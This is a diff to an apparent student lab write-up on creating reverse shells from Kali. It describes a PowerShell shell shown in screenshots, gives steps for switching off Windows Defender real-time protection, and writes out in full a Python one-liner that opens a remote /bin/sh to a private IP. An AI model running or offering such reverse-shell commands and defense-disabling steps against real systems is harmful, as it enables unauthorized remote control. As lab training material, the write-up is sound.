@@ -69,17 +69,43 @@ References: https://book.hacktricks.xyz/shells/shells/windows
 
 The following powershell code is run via cmd.exe. Change ATTACKERIP and ATTACKERPORT to the eth0 IP on kali and port you assigned to a nc listener.
 
+![image-20221106014749383](./images/19.png)
+
+Before we start play with code we need to turn off windows defender:
+
+Search for "Virus & threat protection" ----> go to "manage settings" -----> and switch off the "Real-time protection is ..."
+
+![image-20221106013249985](./images/22.png)
+
+![image-20221106013433200](./images/23.png)
+
+First I took the PowerShell script and then I changed the ip and the port.
+
+![image-20221106014303118](./images/17.png)
+
+And then I checked my kali box and I had connection:
+
+![image-20221106014553326](./images/18.png)
 
 
 
 
 
+Python:
+
+Reference: https://pentesting.one2bla.me/payloads/payloads
+
+ `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.17.119",4449));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+![image-20221106012703108](./images/21.png)
+
+![image-20221106012108759](./images/20.png)
 
 
 
+## Reflections: 
 
-
-
+This lab was fun and interesting. I had some hard time when I tried to create a reverse shell using PHP, looks like it is not installed on hasan.hashim@cyber@10.0.17.200 Linux and I don't root access to install it. But at the end I used Python.
 
 
 
